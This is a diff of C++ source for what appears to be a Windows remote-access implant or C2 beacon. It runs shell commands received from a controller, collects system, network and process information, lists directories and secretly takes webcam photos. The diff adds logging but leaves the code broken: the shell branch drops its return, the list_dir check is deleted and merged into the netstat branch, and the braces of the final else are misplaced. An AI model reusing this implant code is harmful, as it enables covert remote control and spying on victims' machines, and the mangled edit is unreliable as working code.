@@ -1,4 +1,3 @@
-#include <iostream>
 #include <sstream>
 #include <string>
 #include <windows.h>
@@ -10,10 +9,11 @@
 #include <vector>
 #include <cstdio>
 #include <tlhelp32.h>
-#include <json/json.h>  // Include jsoncpp header
+#include <json/json.h> 
 
-#include "directory_traversal.h"
-#include "images.h"
+#include "directory_traversal.hpp"
+#include "images.hpp"
+#include "../../Generic/logging.hpp"   
 
 
 #pragma comment(lib, "iphlpapi.lib")
@@ -21,11 +21,13 @@
 
 std::string executeShellCommand(const char* cmd) {
     std::array<char, 2048> buffer;
-    std::string result;
+    logger.log("Executing shell command: " + std::string(cmd));
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
     if (!pipe) {
+        logger.error("_popen() failed!");
         throw std::runtime_error("_popen() failed!");
     }
+    std::string result;
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
         result += buffer.data();
     }
@@ -36,14 +38,17 @@ std::string executeShellCommand(const char* cmd) {
 std::string listProcesses() {
     std::stringstream ss;
     HANDLE hProcessSnap;
-    PROCESSENTRY32 pe32;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        logger.error("Unable to create toolhelp snapshot!");
         return "Error: Unable to create toolhelp snapshot!";
     }
+
+    PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     if (!Process32First(hProcessSnap, &pe32)) {
         CloseHandle(hProcessSnap);
+        logger.error("Unable to retrieve process information!");
         return "Error: Unable to retrieve process information!";
     }
     do {
@@ -53,14 +58,15 @@ std::string listProcesses() {
     return ss.str();
 }
 
+
 std::string getMacAddress() {
     IP_ADAPTER_INFO AdapterInfo[16];   
     DWORD dwBufLen = sizeof(AdapterInfo);  
-
     DWORD dwStatus = GetAdaptersInfo(   
         AdapterInfo,                      
         &dwBufLen);                      
     if (dwStatus != ERROR_SUCCESS) {
+        logger.error("Error retrieving MAC address");
         return "Error retrieving MAC address";
     }
 
@@ -107,13 +113,14 @@ std::string getSystemInfo() {
     ss << "OS Platform ID = " << osvi.dwPlatformId << "\n";
     ss << "OS Service Pack = " << osvi.szCSDVersion << "\n";
     return ss.str();
-} 
+}
 
 std::string listDirectory(const std::string& directory) {
     WIN32_FIND_DATA findFileData;
     HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);
 
     if (hFind == INVALID_HANDLE_VALUE) {
+        logger.error("Error opening directory: " + directory);
         return "Error opening directory: " + directory;
     }
 
@@ -157,8 +164,7 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "switch_beacon") {
     } else if (command == "shell") {
         std::string output = executeShellCommand(command_data.c_str());
-        std::cout << "Shell command output: " << output << std::endl;
-        return output;
+        logger.log("Shell command output: " + output);
     } else if (command == "list_processes") {
     } else if (command == "systeminfo") {
         std::string output = getSystemInfo();
@@ -174,14 +180,15 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "list_services") {
     } else if (command == "disk_usage") {
     } else if (command == "netstat") {
-    } else if (command == "list_dir") { // need to check if it starts with shell, limitation of current beacon on server
+        logger.error("Unknown command: " + command);
         std::string output = listDirectory(command_data.c_str());
         return output;
     } else if (command == "snap") {
         CapturePhoto(L"test.jpg");
         return "Picture taken";
     } else {
-        std::cerr << "Unknown command: " << command << std::endl;
-    }
+        logger.error("Unknown command: " + command);
     return "not a supported command";
+    }
+    return "error";
 }
